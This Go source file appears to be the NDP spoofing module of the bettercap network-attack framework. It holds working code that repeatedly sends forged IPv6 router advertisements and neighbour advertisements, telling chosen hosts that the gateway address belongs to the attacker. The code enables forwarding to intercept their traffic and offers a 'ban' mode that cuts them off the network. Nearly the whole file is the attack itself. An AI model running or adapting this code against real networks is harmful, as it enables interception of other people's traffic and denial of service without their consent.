package ndp_spoof

import (
	"fmt"
	"net"
	"sync"
	"time"

	"github.com/bettercap/bettercap/network"
	"github.com/bettercap/bettercap/packets"

	"github.com/bettercap/bettercap/session"
)

type NDPSpoofer struct {
	session.SessionModule
	neighbour    net.IP
	prefix       string
	prefixLength int
	macs         []net.HardwareAddr
	addresses    []net.IP
	ban          bool
	waitGroup    *sync.WaitGroup
}

func NewNDPSpoofer(s *session.Session) *NDPSpoofer {
	mod := &NDPSpoofer{
		SessionModule: session.NewSessionModule("ndp.spoof", s),
		addresses:     make([]net.IP, 0),
		macs:          make([]net.HardwareAddr, 0),
		ban:           false,
		waitGroup:     &sync.WaitGroup{},
	}

	mod.SessionModule.Requires("net.recon")

	mod.AddParam(session.NewStringParameter("ndp.spoof.targets", "", "",
		"Comma separated list of IPv6 addresses, MAC addresses to spoof."))

	mod.AddParam(session.NewStringParameter("ndp.spoof.neighbour",
		"fe80::1",
		session.IPv6Validator,
		"Neighbour IPv6 address to spoof, clear to disable NA."))

	mod.AddParam(session.NewStringParameter("ndp.spoof.prefix", "d00d::", "",
		"IPv6 prefix for router advertisements spoofing, clear to disable RA."))

	mod.AddParam(session.NewIntParameter("ndp.spoof.prefix.length", "64",
		"IPv6 prefix length for router advertisements."))

	mod.AddHandler(session.NewModuleHandler("ndp.spoof on", "",
		"Start NDP spoofer.",
		func(args []string) error {
			return mod.Start()
		}))

	mod.AddHandler(session.NewModuleHandler("ndp.ban on", "",
		"Start NDP spoofer in ban mode, meaning the target(s) connectivity will not work.",
		func(args []string) error {
			mod.ban = true
			return mod.Start()
		}))

	mod.AddHandler(session.NewModuleHandler("ndp.spoof off", "",
		"Stop NDP spoofer.",
		func(args []string) error {
			return mod.Stop()
		}))

	mod.AddHandler(session.NewModuleHandler("ndp.ban off", "",
		"Stop NDP spoofer.",
		func(args []string) error {
			return mod.Stop()
		}))

	return mod
}

func (mod NDPSpoofer) Name() string {
	return "ndp.spoof"
}

func (mod NDPSpoofer) Description() string {
	return "Keep spoofing selected hosts on the network by sending spoofed NDP router advertisements."
}

func (mod NDPSpoofer) Author() string {
	return "Simone Margaritelli <evilsocket@gmail.com>"
}

func (mod *NDPSpoofer) Configure() error {
	var err error
	var neigh string
	var targets string

	if err, targets = mod.StringParam("ndp.spoof.targets"); err != nil {
		return err
	}

	if targets == "" {
		mod.neighbour = nil
		mod.addresses = mod.addresses[:0]
		mod.macs = mod.macs[:0]
	} else {
		if mod.addresses, mod.macs, err = network.ParseTargets(targets, mod.Session.Lan.Aliases()); err != nil {
			return err
		}

		if err, neigh = mod.StringParam("ndp.spoof.neighbour"); err != nil {
			return err
		} else if mod.neighbour = net.ParseIP(neigh); mod.neighbour == nil {
			return fmt.Errorf("can't parse neighbour address %s", neigh)
		}

		mod.Debug(" addresses=%v macs=%v", mod.addresses, mod.macs)
	}

	if err, mod.prefix = mod.StringParam("ndp.spoof.prefix"); err != nil {
		return err
	} else if err, mod.prefixLength = mod.IntParam("ndp.spoof.prefix.length"); err != nil {
		return err
	}

	if !mod.Session.Firewall.IsForwardingEnabled() {
		if mod.ban {
			mod.Warning("running in ban mode, forwarding not enabled!")
			mod.Session.Firewall.EnableForwarding(false)
		} else {
			mod.Info("enabling forwarding")
			mod.Session.Firewall.EnableForwarding(true)
		}
	}

	return nil
}

func (mod *NDPSpoofer) Start() error {
	if err := mod.Configure(); err != nil {
		return err
	}

	if mod.neighbour == nil && mod.prefix == "" {
		return fmt.Errorf("please set a target or a prefix")
	}

	return mod.SetRunning(true, func() {
		mod.Info("ndp spoofer started - targets=%s neighbour=%s prefix=%s", mod.addresses, mod.neighbour, mod.prefix)

		mod.waitGroup.Add(1)
		defer mod.waitGroup.Done()

		for mod.Running() {
			if mod.prefix != "" {
				mod.Debug("sending router advertisement for prefix %s(%d)", mod.prefix, mod.prefixLength)
				err, ra := packets.ICMP6RouterAdvertisement(mod.Session.Interface.IPv6, mod.Session.Interface.HW,
					mod.prefix,	uint8(mod.prefixLength))
				if err != nil {
					mod.Error("error creating ra packet: %v", err)
				} else if err = mod.Session.Queue.Send(ra); err != nil {
					mod.Error("error while sending ra packet: %v", err)
				}
			}

			if mod.neighbour != nil {
				for victimAddr, victimHW := range mod.getTargets(true) {
					victimIP := net.ParseIP(victimAddr)

					mod.Debug("we're saying to %s(%s) that %s is us(%s)",
						victimIP, victimHW,
						mod.neighbour,
						mod.Session.Interface.HW)

					if err, packet := packets.ICMP6NeighborAdvertisement(mod.Session.Interface.HW, mod.neighbour, victimHW, victimIP, mod.neighbour); err != nil {
						mod.Error("error creating na packet: %v", err)
					} else if err = mod.Session.Queue.Send(packet); err != nil {
						mod.Error("error while sending na packet: %v", err)
					}
				}
			}

			time.Sleep(1 * time.Second)
		}
	})
}

func (mod *NDPSpoofer) Stop() error {
	return mod.SetRunning(false, func() {
		mod.Info("waiting for NDP spoofer to stop ...")
		mod.ban = false
		mod.waitGroup.Wait()
	})
}

func (mod *NDPSpoofer) getTargets(probe bool) map[string]net.HardwareAddr {
	targets := make(map[string]net.HardwareAddr)

	// add targets specified by IP address
	for _, ip := range mod.addresses {
		if mod.Session.Skip(ip) {
			continue
		}
		// do we have this ip mac address?
		if hw, err := mod.Session.FindMAC(ip, probe); err == nil {
			targets[ip.String()] = hw
		} else {
			mod.Info("couldn't get MAC for ip=%s, error: %v, put it into the neighbour table manually e.g. ping -6", ip, err)
		}
	}
	// add targets specified by MAC address
	for _, hw := range mod.macs {
		if ipVersions, err := network.ArpInverseLookup(mod.Session.Interface.Name(), hw.String(), false); err == nil {
			if mod.Session.Skip(net.ParseIP(ipVersions.IPv6)) {
				continue
			}
			targets[ipVersions.IPv6] = hw
		} else {
			mod.Info("couldn't get PI for mac=%s, error: %v put it into the neighbour table manually e.g. ip -6 neigh | grep %s", hw, err)
		}
	}

	return targets
}
